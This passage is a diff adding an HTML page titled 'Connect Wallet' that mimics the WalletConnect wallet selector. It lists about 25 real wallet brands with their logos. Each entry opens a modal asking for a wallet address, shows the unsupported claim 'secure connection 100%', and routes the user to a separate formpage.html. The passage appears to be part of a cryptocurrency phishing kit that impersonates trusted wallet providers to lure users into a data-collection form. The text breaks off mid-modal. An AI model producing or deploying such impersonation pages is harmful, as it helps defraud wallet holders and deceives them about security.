@@ -1,0 +1,1646 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="" type="image/x-icon" />
+    <title>Connect Wallet</title>
+
+    <script src="https://kit.fontawesome.com/78d167673c.js" crossorigin="anonymous"></script>
+    <style media="all" id="fa-v4-font-face">	</style>
+
+    <!-- google fonts link -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700;800;900&display=swap" rel="stylesheet" />
+
+    <!-- bootstrap css link -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous" />
+
+    <link rel="stylesheet" href="/style/animation/2.6 animate.css.css" />
+
+    <link rel="stylesheet" href="./style/walletpage.css" />
+
+</head>
+
+<body>
+
+    <div id="header">
+        <div class="content-box-md">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 col-sm-12 col-xs-12">
+                        <div class="header-text">
+                            <!-- <h4>Apps</h4> -->
+                            <img class="text-center header-img" src="https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="" />
+                            <!-- <h4>Wallets</h4> -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="coin-section">
+        <div class="content-box-md">
+            <div class="container">
+                <div class="row">
+                    <div class=" text-center coin-section-header">
+                        <h1 class="animated pulse">Connect Wallet</h1>
+                        <h6 class="animated pulse">Open protocol for connecting Wallets to Dapps</h6>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="coin-registry">
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal71" class="btn coin">
+                            <img class="coin-img" src="https://ethereum-magicians.org/uploads/default/original/1X/e726391f66eb7da7a0ed7d780b4df5e8e2416a17.png" alt="" />
+                            <h4>Wallet Connect</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal71" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="omo" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" onclick="submitInput()">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg" alt="" style="border-radius: 40px;" />
+                            <h4>Rainbow</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input2" onlick="submitInput()">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal2" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpeg" alt="" />
+                            <h4>Trust</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal2" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input3">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal3" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpeg" alt="" />
+                            <h4>Argent</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal3" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input3">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal4" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpeg" alt="" />
+                            <h4>Metamask</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal4" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="1" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal5" class="btn coin">
+                            <img class="coin-img" src="https://user-images.githubusercontent.com/12424618/54043975-b6cdb800-4182-11e9-83bd-0cd2eb757c6e.png" alt="" style="border-radius: 50%;" />
+                            <h4>Binance Chain</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal5" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="1" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal6" class="btn coin">
+                            <img class="coin-img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/8757.png" alt="" />
+                            <h4>Safemoon</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal6" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal7" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/0b7e0f05-0a5b-4f3c-315d-59c1c4c22c00/lg" alt="" />
+                            <h4>Gnosis Safe</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal7" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal8" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg" alt="" />
+                            <h4>DeFi</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal8" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal9" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpeg" alt="" style="border-radius: 40px;" />
+                            <h4>Pillar</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal9" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal10" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpeg" alt="" />
+                            <h4>imToken</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal10" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal11" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg" alt="" />
+                            <h4>ONTO</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal11" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal12" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg" alt="" />
+                            <h4>TokenPocket</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal12" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal13" class="btn coin">
+                            <img class="coin-img" src="https://cryptologos.cc/logos/aave-aave-logo.png?v=022" alt="" />
+                            <h4>Aave</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal13" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal14" class="btn coin">
+                            <img class="coin-img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/2772.png" alt="" />
+                            <h4>Digitex</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal14" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal15" class="btn coin">
+                            <img class="coin-img" src="https://www.gitbook.com/cdn-cgi/image/width=24,height=24,fit=contain,dpr=1.5,format=auto/https%3A%2F%2F3632261023-files.gitbook.io%2F~%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fspaces%252F-MVOiF6Zqit57q_hxJYp%252Favatar-1615495356537.png%3Fgeneration%3D1615495356841399%26alt%3Dmedia" alt="" />
+                            <h4>Phantom</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal15" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal16" class="btn coin">
+                            <img class="coin-img" src="https://s2.coinmarketcap.com/static/img/coins/64x64/9195.png" alt="" />
+                            <h4>Coinbase</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal16" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal17" class="btn coin">
+                            <img class="coin-img" src="https://www.portis.io/static/logo-small.svg" alt="" />
+                            <h4>Portis</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal17" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal18" class="btn coin">
+                            <img class="coin-img" src="https://www.gitbook.com/cdn-cgi/image/width=40,height=40,fit=contain,dpr=2.0000000596046448,format=auto/https%3A%2F%2F2510867812-files.gitbook.io%2F~%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fspaces%252F-Lj7HukBJLlR6jbx0-eP%252Favatar.png%3Fgeneration%3D1578363251850322%26alt%3Dmedia " alt="" />
+                            <h4>Formatic</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal18" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal19" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg" alt="" />
+                            <h4>MathWallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal19" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal20" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://registry.walletconnect.org/logo/lg/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpeg" alt="" />
+                            <h4>BitPay</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal20" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal21" class="btn coin">
+                            <img class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/e8803581-a57f-4e4f-5a1b-c642c5da1900/lg" alt="" />
+                            <h4>Ledger Live</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal21" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal22" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpeg" alt="" />
+                            <h4>WallETH</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal22" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal23" class="btn coin">
+                            <img class="coin-img" src="https://registry.walletconnect.org/logo/lg/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpeg" alt="" />
+                            <h4>Authereum</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal23" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal24" class="btn coin">
+                            <img class="coin-img" src="https://is3-ssl.mzstatic.com/image/thumb/Purple116/v4/6a/2f/a3/6a2fa3f5-2abd-594f-cd13-c68e04090e8b/source/60x60bb.jpg" alt="" />
+                            <h4>Dharma</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal24" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
+                                        <a href="./walletpage.html"><button type="button" class="btn btn_close">Close</button></a>
+                                        <a href="./formpage.html"><button type="button" class="btn btn_proceed btn-primary" data-input-id="input1">Proceed</button></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal25" class="btn coin">
+                            <img style="border-radius: 40px;" class="coin-img" src="https://imagedelivery.net/_aTEfDRm7z3tKgu9JhfeKA/dce1ee99-403f-44a9-9f94-20de30616500/lg" alt="" />
+                            <h4>1inch Wallet</h4>
+                        </button>
+                        <!-- Modal -->
+                        <div class="modal fade" id="exampleModal25" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                            <div class="modal-dialog modal-dialog-centered">
+                                <div class="modal-content">
+                                    <div class="modal-header">
+                                        <h5 class="modal-title modal_title" id="exampleModalLabel">Enter Wallet Address</h5>
+                                    </div>
+                                    <div class="modal-body">
+                                        <input required="" class="wallet-address" type="text" name="" id="" />
+                                    </div>
+                                    <div class="modal-footer">
+                                        <small>secure connection 100%</small>
